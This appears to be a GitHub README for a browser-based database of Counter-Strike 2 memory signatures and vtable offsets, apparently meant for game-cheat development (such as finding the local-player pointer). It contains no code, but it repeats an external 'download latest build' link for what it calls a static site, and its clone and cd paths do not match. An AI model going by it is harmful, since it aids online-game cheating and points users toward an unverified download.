# Malvorus Pattern Database - Binary Pattern Database 2026

> A web-based binary pattern database for Counter-Strike 2 reverse engineering, built around verified signatures, vtable indices, and quick copy actions, with support for community contributions.

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandonceczking7117/malvorus-searchable-patterns?style=flat-square)](https://github.com/brandonceczking7117/malvorus-searchable-patterns)

---

<p align="center">
  <a href="https://brandonceczking7117.github.io/malvorus-searchable-patterns/">
    <img src="https://img.shields.io/badge/Download-Malvorus%20Pattern%20Database%20Latest-brightgreen?style=for-the-badge" alt="Download Malvorus Pattern Database">
  </a>
</p>

> **[Download Latest Build - Malvorus Pattern Database v1.0.0](https://brandonceczking7117.github.io/malvorus-searchable-patterns/)**

---

[Download Latest Build](https://brandonceczking7117.github.io/malvorus-searchable-patterns/)

---

## Overview

Malvorus Pattern Database is a browser-based catalog of binary pattern signatures for the Counter-Strike 2 client.dll module. It gives reverse engineers and developers a curated place to browse verified signatures, vtable offsets, and pattern definitions through a searchable interface. Instead of relying on scattered forum posts or stale references, the project offers one central resource that can be explored and expanded by the community.

If you are creating internal utilities, tracking game updates, or studying memory layouts, this database simplifies the task of locating and reusing binary patterns. Entries include expandable information, module labels, and status markers so you can quickly spot patterns you can trust. Contributions from the community are encouraged to help the collection stay current as the game changes.

---

## Key Capabilities

- **Full-text search** across pattern names, descriptions, and metadata
- **Module and status filters** for client.dll, server.dll, and more, with states such as verified, untested, and deprecated
- **One-click clipboard copy** for pattern bytes, masks, or vtable indices
- **Expandable entry details** with complete signatures, offsets, and notes
- **Ctrl+K shortcut** for jumping straight to the search field
- **Responsive layout** suitable for desktop and mobile browsers
- **Community contributions** through pull requests or issue templates

---

## Installation

Clone the repository to your local machine or download the latest build from the link above:

```bash
git clone https://github.com/brandonceczking7117/malvorus-searchable-patterns.git
cd malvorus-patterns-database
```

The database is a static HTML/CSS/JS site. Open `index.html` in any modern browser, or serve it locally with:

```bash
python -m http.server 8000
```

Then navigate to `http://localhost:8000` in your browser.

---

## How to Use It

1. Open the database in your browser.
2. Use the search bar to look up patterns by name, module, or description.
3. Click the copy icon next to any pattern to copy its signature to your clipboard.
4. Click on a row to expand details, including full pattern bytes, mask, and vtable index.
5. Use the filter dropdowns to narrow results by module or status.

Example workflow: Search for "dwLocalPlayer" to find the local player pointer pattern, copy its signature, and paste it directly into your reverse engineering tool.

---

## Configuration

The database is self-contained and does not require external configuration. All data is stored in a single JavaScript file (`patterns.js`) that defines the pattern entries. To add or modify patterns, edit this file following the existing entry format. Settings such as default filters or theme preferences are stored in browser localStorage and can be reset via the interface.

---

## Requirements

- A modern web browser (Chrome, Firefox, Edge, or Safari)
- No server-side dependencies - the entire database runs client-side
- Internet connection only required for initial download or updates
- Approximately 5 MB of disk space for the full repository

---

## FAQ

**Is the database automatically updated?**  
The database is updated manually as new patterns are verified or submitted. Check the repository for the latest release notes.

**How can I contribute a pattern?**  
Open an issue or submit a pull request with the pattern details. Follow the format in `patterns.js` for consistency.

**Can I use these patterns in commercial projects?**  
Yes, under the terms of the GNU GPL v3.0 license. See the license section for details.

**What if a pattern is incorrect?**  
Report it via an issue. Each entry has a status field that can be marked as deprecated or untested.

**Does the database support other games?**  
Currently it focuses on Counter-Strike 2, but the structure can accommodate other modules. Community submissions for additional games are welcome.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
